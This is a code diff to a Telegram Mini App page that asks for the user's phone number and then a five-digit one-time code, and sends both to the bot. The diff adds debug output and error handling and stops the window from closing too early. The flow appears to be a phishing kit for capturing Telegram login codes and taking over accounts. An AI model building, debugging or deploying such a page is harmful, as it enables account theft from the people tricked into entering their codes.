@@ -14,6 +14,7 @@
         .code-cell { width: 45px; height: 55px; border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 600; transition: border-color 0.2s; }
         .code-cell.filled { border-color: var(--tg-theme-button-color, #3390ec); }
         .code-cell.active { border-color: var(--tg-theme-button-color, #3390ec); box-shadow: 0 0 0 2px rgba(51, 144, 236, 0.2); }
+        #debug-msg { color: red; font-size: 12px; margin-top: 20px; }
     </style>
 </head>
 <body>
@@ -36,8 +37,12 @@
         <input type="text" id="code-input" class="code-input" inputmode="numeric" autocomplete="one-time-code" maxlength="5">
     </div>
 
+    <div id="debug-msg"></div>
+
     <script>
         window.onload = function() {
+            const debugEl = document.getElementById('debug-msg');
+            
             if (window.Telegram && window.Telegram.WebApp) {
                 const tg = window.Telegram.WebApp;
                 tg.expand();
@@ -46,19 +51,26 @@
                 // Запрос номера
                 tg.MainButton.setText("SHARE PHONE NUMBER");
                 tg.MainButton.show();
+                
                 tg.MainButton.onClick(function() {
-                    tg.requestContact(function(shared, contact) {
-                        if (shared && contact) {
-                            document.getElementById('screen-phone').classList.add('hidden');
-                            document.getElementById('screen-code').classList.remove('hidden');
-                            tg.MainButton.hide();
-                            
-                            // Отправляем номер
-                            tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
-                            
-                            setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
-                        }
-                    });
+                    try {
+                        tg.requestContact(function(shared, contact) {
+                            if (shared && contact) {
+                                document.getElementById('screen-phone').classList.add('hidden');
+                                document.getElementById('screen-code').classList.remove('hidden');
+                                tg.MainButton.hide();
+                                
+                                // Отправляем номер
+                                tg.sendData(JSON.stringify({ type: "phone", phone: contact.phone_number }));
+                                
+                                setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                            } else {
+                                debugEl.innerText = "Контакт не передан (shared=false)";
+                            }
+                        });
+                    } catch (e) {
+                        debugEl.innerText = "Ошибка requestContact: " + e.message;
+                    }
                 });
 
                 // Ввод кода
@@ -87,13 +99,19 @@
                         isSent = true;
                         this.blur();
                         
-                        // Отправляем код моментально без setTimeout
-                        tg.sendData(JSON.stringify({ type: "code", code: value }));
-                        
-                        // Закрываем окно чуть позже, чтобы данные успели уйти
-                        setTimeout(() => { tg.close(); }, 500);
+                        try {
+                            debugEl.innerText = "Отправка кода...";
+                            tg.sendData(JSON.stringify({ type: "code", code: value }));
+                            debugEl.innerText = "Код отправлен! Можно закрывать.";
+                            // НЕ ЗАКРЫВАЕМ СРАЗУ, чтобы данные точно ушли
+                            // setTimeout(() => { tg.close(); }, 500);
+                        } catch (err) {
+                            debugEl.innerText = "Ошибка sendData: " + err.message;
+                        }
                     }
                 });
+            } else {
+                debugEl.innerText = "Telegram.WebApp не найден! Откройте через бота.";
             }
         };
     </script>
